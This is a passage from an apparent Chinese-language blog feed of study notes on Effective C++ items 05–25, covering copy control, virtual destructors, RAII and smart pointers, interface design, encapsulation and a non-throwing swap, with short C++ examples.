被 local static 替换了：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-keyword">class</span> FileSystem</span><br><span class="hljs-function">FileSystem&amp; <span class="hljs-title">tfs</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">static</span> FileSystem fs;<br>    <span class="hljs-keyword">return</span> fs;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="构造-析构-赋值运算">构造/析构/赋值运算</h2><h3 id="条款-05：了解-C-默默编写并调用了哪些函数">条款 05：了解 C++ 默默编写并调用了哪些函数</h3><p>注意，在程序员没有定义的情况下，编译器会默默地构造出：</p><ul><li>default 构造函数</li><li>non-virtual 析构函数</li><li>copy 构造函数</li><li>copy assignment 操作符</li></ul><p>但一般而言，只有当生成的代码合法且有机会证明其有意义时，才可。</p><h3 id="条款-06：若不想使编译器用自动生成的函数，就应该明确拒绝">条款 06：若不想使编译器用自动生成的函数，就应该明确拒绝</h3><p>若你设计的某一类的对象是独一无二的，不可以被拷贝或者拷贝是无意义的，那么就应该：</p><ul><li>将 copy 构造函数或 copy assignment 操作符声明为 <code>private</code></li><li>不要定义它们</li></ul><p>或者，你也可以继承一个阻止拷贝动作而设计的 base class：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Uncopyable</span> &#123;<br>    <span class="hljs-keyword">protected</span>:<br>    <span class="hljs-built_in">Uncopyable</span>() &#123;&#125;<br>    ~<span class="hljs-built_in">Uncopyable</span>() &#123;&#125;<br>    <span class="hljs-keyword">private</span>:<br>    <span class="hljs-built_in">Uncopyable</span>(<span class="hljs-type">const</span> Uncopyable&amp;);<br>    Uncopyable&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> Uncopyable&amp;);<br>&#125;<br></code></pre></td></tr></table></figure><p>或者考虑使用 Boost 库提供的 <code>noncopyable</code> 类。</p><h3 id="条款-07：为多态基类声明-virtual-析构函数">条款 07：为多态基类声明 virtual 析构函数</h3><p>当 derived class 对象经由一个 base class 指针删除，而该 base class 带有一个 non-virtual 析构函数，就会发生不确定行为。这是因为，<strong>只有 base class 的析构函数会被调用，将 derived class 对象中的 base class 部分销毁了，而剩下 derived class 部分没有销毁</strong>，造成了一个“局部销毁”的现象。因此，带有多态性质的 base class 应该声明一个 <code>virtual</code> 的析构函数。</p><p>而如果 class 不含 <code>virtual</code> 函数，往往表示它并不想做一个 base class，因此令其析构函数为 <code>virtual</code> 也是一个馊主意。因为 <code>virtual</code> 函数会带来完全不必要的开销。但有时候，令 class 带一个 pure virtual 析构函数会十分便利，比如我们在声明一个抽象基类（abstract base class），又想不到其他的 pure virtual 函数时，就可以：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AWOV</span> &#123;<br>    <span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">AWOV</span>() = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="条款-08：别让异常逃离析构函数">条款 08：别让异常逃离析构函数</h3><p>C++ 不喜欢析构函数吐出异常！若你的析构函数必须执行一个动作，且该动作可能会在失败时抛出异常，那么可以在异常出现时就结束程序；也可以吞下异常。但这都不是非常好的选择！我们可以重新设计类的接口，让客户有机会处理可能出现的异常。</p><p>我们将析构函数执行的动作放到另一个新函数中（当然考虑到客户会忘记调用它，会在析构函数里另设一个保险），这样选择权就在客户手里。如果客户认为该动作决不会抛出异常，就不必调用新函数；但若因为客户忘调用新函数，导致析构函数抛出异常进而导致程序进入不确定行为，锅也不在设计者头上，毕竟客户自己放弃了处理异常的机会。</p><h3 id="条款-09：绝不在构造和析构过程中调用-virtual-函数">条款 09：绝不在构造和析构过程中调用 virtual 函数</h3><p>不要在构造函数和析构函数中调用 <code>virtual</code> 函数，这样的调用会带来意想不到的效果。为什么？因为程序会先调用 base class 的构造函数，然后才会使用 derived class ，才会初始化这个 derived class 对象。如果你在构造函数中使用 <code>virtual</code> 函数，编译器只会将它认作为 base class 的对象（因为这时候 derived 部分还未完成构建，其部分成员值仍是未确定的），就会调用 base class 的函数，而不是你想的 derived class 的函数。</p><p>同样道理也适合用于析构函数，当析构函数开始时，derived class 对象就会被逐步销毁，编译器就会把它视作 base class 的对象，调用 base class 的函数。</p><p>可以使用一种办法避免这样的局面。先将构造函数中的 virtual 函数改为 non-virtual ，然后，我们要求 derived class 的构造函数传递必要的信息给 base class 构造函数，然后，base class 的构造函数就可以调用 non-virtual 函数。</p><h3 id="条款-10：令-operator-返回一个-reference-to-this">条款 10：令 operator= 返回一个 reference to *this</h3><p>为了实现像 <code>x = y = z</code> 的连续赋值，赋值操作符必须返回一个 reference 指向操作符的左侧实参。如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C++">Widget&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> Widget&amp; rhs) &#123;<br>    ...<br>    <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="条款-11：在-operator-中处理“自我赋值”">条款 11：在 operator= 中处理“自我赋值”</h3><p><code>*px = *py</code> 如果恰巧 <code>px</code> 和 <code>py</code> 指向了同一个东西，就会发生自我赋值。这会导致“你要使用该资源之前意外地释放了它”的潜在问题。</p><p>可以使用“证同测试”来消除“自我赋值”，即 <code>if (this == &amp;rhs) return *this;</code> 。但为了做得更好，还需要考虑“异常安全性”，可以使用<a href="">条款 29</a> 的 copy and swap 技术，或者可以先暂存原先的值，等到新值被构建好并没有出现问题时，再将旧值抛弃。</p><h3 id="条款-12：复制对象时勿忘其每一个成分">条款 12：复制对象时勿忘其每一个成分</h3><p>如果你自己在写一个 copying 函数时，一定要记住不要遗漏每一个成分，因为编译器不会警告这一点。请确保：1）复制了所有的 local 成员变量。2）调用了所有 base classes 的适当的 copying 函数。</p><p>特别注意，copy assignment 操作符与 copy 构造函数不要相互调用，这是荒谬的。如果你发现了这两个函数有相似的代码，那么你应该写一个第三方函数，再让它们都调用它。</p><h2 id="资源管理">资源管理</h2><h3 id="条款-13：以对象管理资源">条款 13：以对象管理资源</h3><p>为确保分配后的资源总是被释放，我们需要将资源放入到对象内。因为单纯依赖 <code>delete</code> 语句是不能百分百保证资源一定会被释放的，把资源放进对象内，便可倚赖 C++ 的析构函数确保资源被释放。<em>Resource Acquisition Is Initialization (RAII)</em> 告诫我们，在资源被获得的同时，就应该立即被放入管理对象中。</p><p>现在，C++ 11 以上的版本中，<code>tr1::shared_ptr</code> 、<code>tr1::unique_ptr</code> 或者 Boost 的相关库完全可以提供这项服务，不要再使用 raw pointer 了！</p><span id="item14" /><h3 id="条款-14：在资源管理类中小心-copying-行为">条款 14：在资源管理类中小心 copying 行为</h3><p>前面的条款介绍了在 heap-based 资源上的管理方式：使用智能指针。然而并非所有资源都是 heap-based 的，也并非所有资源管理问题都可以用智能指针解决。例如，对于互斥锁（Mutex Lock）而言，我们就需要小心复制行为带来的问题。你可以：</p><ul><li>禁止复制。就如<a href="">条款 06</a> 中做的那样</li><li>对底层资源使用引用计数。在复制时，将资源的引用计数增加，并在最后引用计数归零时删除（释放）资源。注意：<code>tr1::shared_ptr</code> 的删除器可能会帮你大忙。</li><li>复制底部资源。在复制资源管理对象时，应同时复制其所管理的资源，进行深拷贝。</li><li>转移底部资源的控制权。就像 <code>tr1::unique_ptr</code> 做的那样</li></ul><h3 id="条款-15：在资源管理类中提供对原始资源的访问">条款 15：在资源管理类中提供对原始资源的访问</h3><p>这一条款主要是针对那些直接使用 raw pointer 的 APIs 。因为你在编程的过程中几乎不可避免的遇到它们，你需要提供一个取得原始资源的方法。有两种解决方案：</p><ul><li>显式转换。比较安全，比如智能指针的 <code>get()</code> 函数。</li><li>隐式转换。比较方便，例如 <code>operator FontHandle() const &#123; return f; &#125;</code></li></ul><h3 id="条款-16：成对使用-new-和-delete-时要采用相同的形式">条款 16：成对使用 new 和 delete 时要采用相同的形式</h3><p>很简单，若你调用 new 时使用了 <code>[]</code> ，你必须在对应调用 delete 时也使用 <code>[]</code> ，如果你调用 new 时没有使用 <code>[]</code> ，那么也不应在调用对应 delete 时使用 <code>[]</code>。</p><h3 id="条款-17：以独立语句将-newed-对象置入智能指针">条款 17：以独立语句将 newed 对象置入智能指针</h3><p>如果不这样做，有可能导致难以察觉的资源泄漏。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">priority</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">processWidget</span><span class="hljs-params">(std::tr1::shared_ptr&lt;Widget&gt; pw, <span class="hljs-type">int</span> priority)</span></span>;<br><br><span class="hljs-comment">// 调用 priority()</span><br><span class="hljs-comment">// 进行 new  但也可能顺序相反，在 priority() 函数抛出异常后，可能出现内存泄漏</span><br><span class="hljs-built_in">processWidget</span>(std::tr1::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt;(<span class="hljs-keyword">new</span> Widget), <span class="hljs-built_in">priority</span>());<br><br><span class="hljs-comment">// 建议如下：将 new 对象的语句独立出来，不与任何其他语句掺和在一起</span><br>std::<span class="hljs-function">tr1::shared_ptr&lt;Widget&gt; <span class="hljs-title">pw</span><span class="hljs-params">(<span class="hljs-keyword">new</span> Widget)</span></span>;<br><br><span class="hljs-built_in">processWidget</span>(pw, <span class="hljs-built_in">priority</span>());<br></code></pre></td></tr></table></figure><h2 id="设计与声明">设计与声明</h2><h3 id="条款-18：让接口容易被正确使用，不易被误用">条款 18：让接口容易被正确使用，不易被误用</h3><p>理想上，若客户错误地使用了接口，那么这个代码不应通过编译，如果代码可以通过编译，那么接口的行为就应当与客户的期望一致。例如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Date</span> &#123;<br>    <span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">Date</span>(<span class="hljs-type">int</span> month, <span class="hljs-type">int</span> day, <span class="hljs-type">int</span> year);<br>    ...<br>&#125;;<br></code></pre></td></tr></table></figure><p>三个参数都是 <code>int</code> ，客户在使用接口时可能会把年月日的参数传错，也有可能传入了一个不存在的日期，比如 13 月 39 日。阻止误用的办法有：新建新类型，限制类型上的操作，束缚对象值，消除客户的资源管理责任。比如，设计者可以使用类型系统来防止这样的低级错误。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">// 使用外覆类型区别 年月日，但这样无法限制其值</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Month</span> &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">Month</span><span class="hljs-params">(<span class="hljs-type">int</span> m)</span>: val(m) &#123;</span>&#125;<br>    <span class="hljs-type">int</span> val;<br>&#125;;<br><br><span class="hljs-comment">// 可以使用静态函数来限制取值，注意到需要使用函数，详看条款04</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Month</span> &#123;<br>    <span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">static</span> Month <span class="hljs-title">Jan</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">Month</span>(<span class="hljs-number">1</span>); &#125;<br>    <span class="hljs-function"><span class="hljs-type">static</span> Month <span class="hljs-title">Feb</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">Month</span>(<span class="hljs-number">2</span>); &#125;<br>    ....<br>        <span class="hljs-function"><span class="hljs-type">static</span> Month <span class="hljs-title">Dec</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">Month</span>(<span class="hljs-number">12</span>); &#125;<br>&#125;;<br><br><span class="hljs-function">Date <span class="hljs-title">d</span><span class="hljs-params">(Month::Jan(), Day(<span class="hljs-number">30</span>), Year(<span class="hljs-number">2010</span>))</span></span>;<br></code></pre></td></tr></table></figure><p>为避免资源泄露，可以将接口</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function">Tank* <span class="hljs-title">createTank</span><span class="hljs-params">()</span></span>;<br></code></pre></td></tr></table></figure><p>改成：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">std::<span class="hljs-function">tr1::shared_ptr&lt;Tank&gt; <span class="hljs-title">createTank</span><span class="hljs-params">()</span></span>;<br></code></pre></td></tr></table></figure><p>强迫客户使用智能指针，其好处正如<a href="#item14">条款 14</a>所言，也可以防范 <a href="https://blog.csdn.net/pxhero2012/article/details/8974370">cross-DLL problem</a>。</p><h3 id="条款-19：设计-class-犹如设计-type">条款 19：设计 class 犹如设计 type</h3><p>设计一个好的 type 是一项艰巨的工作，自然的语法、直观的语义、一个或多个高效实现等。重载函数、控制内存、定义对象等都需要注意。你要考虑好以下问题：新的类型对象如何被创建和销毁？对象的初始化和赋值会有什么差别？新类型的对象若是 pass-by-value ，意味着什么？什么是该类的合法值？新的类型需要配合某个继承图系吗？新的类型需要什么样的转换？哪些操作符和函数对新类型而言是合理的？哪些标准函数必须被驳回？谁该使用新类型的成员？什么是新类型的未声明接口？新类型有多么一般化？你真的需要一个新类型吗？</p><h3 id="条款-20：宁以-pass-by-reference-to-const-替换-pass-by-value">条款 20：宁以 pass-by-reference-to-const 替换 pass-by-value</h3><p>默认情况下，C++ 都是使用 by-value 方式传递对象。这过程中会使用 copy 构造函数，对于一些体量庞大的对象来说，pass-by-value 是<strong>非常耗时</strong>的操作（因为要复制很多字节）。事实上，该条款给出的忠告可以这么理解，<strong>除了 C++ 中的内置类型和 STL 的迭代器和函数对象，其他任何东西（尤其是你实现的类）都最好使用 pass-by-reference-const 。</strong></p><p>除了效率方面的考量，by reference 传递参数也可以避免<strong>对象切割</strong>的问题。当一个 derived class 对象以 by value 的方式传递到函数中，而函数参数的类型是 base class 类，那么 base class 的 copy 构造函数会被调用，导致传入的对象变成了 base class ，绝不会是你想要的 derived class。</p><p>references 在 C++ 编译器的底层中，往往通过指针实现。</p><h3 id="条款-21：必须返回对象时，别妄想返回其-reference">条款 21：必须返回对象时，别妄想返回其 reference</h3><p>可能受到上一条款的影响，我们可能会陷入另一个误区——在所有地方都是用 by reference 传递对象。然而，我们不可能传递一些 reference 指向其实<strong>不存在的对象</strong>。</p><p>比如，你可能会在函数的最后，返回一个 local 变量的 reference😅。这是相当危险的，因为函数调用一旦结束，local 变量就会被销毁释放，其 reference 就指向了一个毫无意义的东西。当然，你可能还会想将 local 变量放入 heap 中，或者使用 <code>static</code> 变量，那就更离谱了。</p><p>当程序在逻辑上，就要返回一个新对象时，请不要吝啬这一点点的拷贝效率，就让那个函数返回一个新对象。</p><h3 id="条款-22：将成员变量声明为-private">条款 22：将成员变量声明为 private</h3><p>很多人都说所有的成员变量最好为 <code>private</code> ，可实际做工程时却又怕麻烦直接使用 <code>public</code> 的成员变量😅。事实上，类的所有成员变量都需要为 <code>private</code> ，然后使用函数做读/写访问。有两大原因：</p><ul><li>使用函数控制可以让成员变量的处理有更精密的控制，比如，你可以通过设置 getter 和 setter 实现只读访问、不准访问、读写访问，甚至只写访问。</li><li>封装。如果有一个成员变量是 <code>public</code> ，并且在工程后续中客户使用了它。那么，一旦你需要对该类进行更改维护，你会发现很多客户的代码都需要变更！这是一个非常可怕的工作量。<code>private</code> 提供了非常好的封装，而且，我们使用类的一个原因不就是它的封装性么？</li></ul><h3 id="条款-23：宁以-non-member-non-friend-替换-member-函数">条款 23：宁以 non-member non-friend 替换 member 函数</h3><p>还是一个与封装性有关的条款。面向对象守则要求数据应该尽可能地被封装，然而与直觉相反的是，提供 non-member 函数可允许对类的相关功能有较大的灵活性，可以更好地封装。为什么？从封装的角度出发，<strong>如果类内的东西被封装，它就不再可见，越多东西被封装，越少的人可以看到它，越少的人看到它，就意味着我们有越大的弹性来改变它</strong>！</p><p>就如条款 22 所说，将成员变量声明为 <code>private</code>，那么就只有 class 的成员函数和其 friend 函数看到而已，改变就相对容易，改变的弹性就越大。增加一个member 函数就意味着增加一个可以窥见类内部秘密的“知情人”，其封装性就会减弱。因此，如果要在一个 member 函数（可以改变类内的 <code>private</code> 数据）和一个 non-member non-friend 函数中二选一，那么从封装的角度考虑，non-member non-friend 函数会更好。</p><p>值得注意的是，成为类的 non-member non-friend 函数并不意味它不可以是另一个 class 的 member ，比如可以设立某些工具类的 member 函数来完成这差事。</p><p>但在 C++ 中，更加自然的做法就是让 class 和这些 non-member non-friend 函数存在于同一个 <code>namespace</code> 中。因为 <code>namespace</code> 可以跨文件，那么这些 non-member non-friend 函数就可以按分类放在不同的文件内，当客户需要时，再 <code>#include</code> 相应的头文件，以此降低编译依赖性。C++ 的标准程序库就是这样组织起来的。</p><h3 id="条款-24：若所有参数皆需类型转换，请为此采用-non-member-函数">条款 24：若所有参数皆需类型转换，请为此采用 non-member 函数</h3><p>如果你需要为某个函数的所有参数（包括被 <code>this</code> 指针所指的那个隐喻参数）进行类型转换，那么这个函数必须是个 non-member 。</p><p>举个例子来说明该条款，假设一个你设计的 <code>Rational</code> 类，用于计算分数的加减乘除。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Rational</span> &#123;<br>    <span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">Rational</span>(<span class="hljs-type">int</span> numerator = <span class="hljs-number">0</span>, <span class="hljs-type">int</span> denominator = <span class="hljs-number">1</span>);<br>    ...<br>        <span class="hljs-type">const</span> Rational <span class="hljs-keyword">operator</span>*(<span class="hljs-type">const</span> Rational &amp;rhs) <span class="hljs-type">const</span>;<span class="hljs-comment">// 可以想一想为什么接受一个 reference-to-const ，返回一个 const by-value</span><br>&#125;<br></code></pre></td></tr></table></figure><p>重载 * 函数可以让你完成很多乘法运算，但</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">Rational <span class="hljs-title">oneEight</span><span class="hljs-params">(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>)</span></span>;<br><span class="hljs-function">Rational <span class="hljs-title">oneHalf</span><span class="hljs-params">(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)</span></span>;<br>Rational result = oneHalf * oneEight; <span class="hljs-comment">// good</span><br>result = oneHalf * <span class="hljs-number">2</span><span class="hljs-comment">// good</span><br>result = <span class="hljs-number">2</span> * oneHalf    <span class="hljs-comment">// Error!</span><br></code></pre></td></tr></table></figure><p>为什么最后一句话错了，因为整数 2 并没有相应的 <code>operator*</code> 函数！同样因为不存在接受 <code>int</code> 和 <code>Rational</code> 的函数，<code>result = operator*(2, oneHalf)</code> 也会报错。为什么倒数第二句话对，最后一句话错？因为只有当参数被列于参数列（parameter list），这个参数才是隐式类型转换的合格参与者！整数在第一个时，就无法隐式转换了。</p><p>其实，我们的目标就是让编译器把整数 2 “看作”一个 <code>Rational</code> 对象，那么，应当怎么办呢？很简单，只要我们避开 member 函数的陷阱，使用 non-member 函数，让第一个乘数也可以被放入参数列中就行。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">const</span> Rational <span class="hljs-keyword">operator</span>*(<span class="hljs-type">const</span> Rational &amp;lhs, <span class="hljs-type">const</span> Rational &amp;rhs);<br></code></pre></td></tr></table></figure><h3 id="条款-25：考虑写一个不抛出异常的-swap-函数">条款 25：考虑写一个不抛出异常的 swap 函数</h3><p>swap 函数，原本只是用于将两者交换，但现在，却被赋予了更多重大的任务。用 swap 来应对异常安全性编程（见条款 29）和处理自我赋值（条款 11）已经非常常见。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">namespace</span> std &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><br><span class="hljs-function">    <span class="hljs-type">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(T&amp; a, T&amp; b)</span> </span>&#123;<br>        <span class="hljs-function">T <span class="hljs-title">temp</span><span class="hljs-params">(a)</span></span>;<br>        a = b;<br>        b = temp;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>不过，我们还是得一步一步地讨论问题，首先来看效率方面。</p><p><code>std::swap</code> 会调用 copy 构造函数来完成交换，而很多时候 <code>std::swap</code> 对你的类型效率不高时，此时就需要提供一个 swap 成员函数，并确定这个函数不抛出异常。比如说，你设计的类型是一种“以指针指向对象，内含真正数据”的，即所谓的 <strong>pimpl 手法</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Widget</span> &#123;<br>    <span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">Widget</span>(<span class="hljs-type">const</span> Widget &amp;rhs);<br>    Widget&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> Widget &amp; rhs) &#123;<br>            ...<br>            *pImpl = *(rhs.pImpl);<br>        &#125;<br>    <span class="hljs-keyword">private</span><br>        WidgetImpl* pImpl;<br>&#125;<br></code></pre></td></tr></table></figure><p>那么如果要交换两个值，最有效率的办法毫无疑问就是交换它们内部的指针。那么，我们该怎么做才能让 <code>std::swap</code> 明白这一点呢？或者说我们要自己实现一个交换函数吗？可以利用 <code>std::swap</code> 的全特化版本，让 swap template 在遇到某一特定的类（Widget）时才会使用我们写的版本。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">namespace</span> std &#123;<br>    <span class="hljs-keyword">template</span>&lt;&gt;<br>    <span class="hljs-type">void</span> <span class="hljs-built_in">swap</span>&lt;Widget&gt;(Widget &amp;a, Widget &amp;b) &#123;<br>        a.<span class="hljs-built_in">swap</span>(b);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Widget</span> &#123;<br>    <span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">swap</span> <span class="hljs-params">(Widget &amp; rhs)</span> </span>&#123;<br>            <span class="hljs-keyword">using</span> std::swap;<br>            <span class="hljs-built_in">swap</span>(pImpl, rhs.pImpl);<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但如果遇到了 class template，情况就会变得更加复杂。因为 C++ 不允许偏特化一个 function template，只允许偏特化 class template。更重要的是，std 允许客户全特化内部的 template，但不允许添加新的 template 或者 class 等东西，这意味着我们也无法重载 <code>std::swap</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">WidgetImpl</span> &#123;...&#125;;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Widget</span> &#123;...&#125;;<br><br><span class="hljs-comment">// nonono</span><br><span class="hljs-keyword">namespace</span> std &#123;<br>    <span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt; <span class="hljs-comment">// 不合法</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(Widget&lt;T&gt; &amp; a, Widget&lt;T&gt; &amp; b)</span> </span>&#123; a.<span class="hljs-built_in">swap</span>(b);&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以声明一个 non-member swap ，让它调用 member swap，但不再将 non-member swap 声明为 <code>std::swap</code> 的全特化版本。它们存在于某个命名空间中（不能是 std）。但是，客户调用 swap 时，可不知道到底用哪个命名空间的 swap（客户甚至不知道 WidgetStuff 命名空间中是否存在专属的 swap），所以，我们需要用 <code>using std::swap</code> ，让 C++ 编译器在找不到原命名空间下的 swap 时，去调用 <code>std::swap</code> 。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">namespace</span> WidgetStuff &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><br><span class="hljs-function">    <span class="hljs-type">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(Widget&lt;T&gt;&amp; a, Widget&lt;T&gt; &amp;b)</span> </span>&#123;<br>        a.<span class="hljs-built_in">swap</span>(b);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 交换时，可以如下调用</span><br><span class="hljs-keyword">using</span> std::swap;<br><span class="hljs-built_in">swap</span>(obj1, obj2);<br></code></pre></td></tr></table></figure><p>但不能这么写 <code>std::swap(obj1, obj2);</code> 。这样是在强制 C++ 编译器使用 std 空间下的 swap 函数，我们的本意可不是这样。</p><p>最后的最后，成员版的 swap 绝不可以抛出异常，因为 swap 的一个最好的应用就是提供强烈的异常安全性保障（条款 29）。注意，只是成员版的 swap 。</p>]]></content>
    
    
    <categories>
      
      <category>Cpp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cpp</tag>
      
      <tag>Effective C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apollo Cyber RT 调度系统</title>
    <link href="/2020/10/17/2020-10-17-Cyber%20RT/"/>
    <url>/2020/10/17/2020-10-17-Cyber%20RT/</url>
    
